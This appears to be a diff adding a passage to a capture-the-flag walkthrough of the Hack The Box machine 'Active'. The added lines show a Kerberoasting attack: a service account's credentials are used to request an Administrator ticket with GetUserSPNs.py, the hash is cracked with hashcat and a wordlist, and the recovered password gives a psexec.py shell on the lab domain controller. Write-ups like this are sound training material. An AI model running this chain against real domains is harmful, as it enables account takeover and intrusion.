@@ -12,3 +12,12 @@ sAMAccountName: SVC_TGS
 
 root@kali:~# GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
 ```
+
+```
+root@kali:~# GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -output tgs-administrator.hash
+root@kali:~# hashcat -a 0 -m 13100 tgs-administrator.hash /usr/share/wordlists/rockyou.txt –force
+root@kali:~# hashcat -m 13100 tgs-administrator.hash –show
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*...[hash-value]...:Ticketmaster1968
+root@kali:~# psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
+```
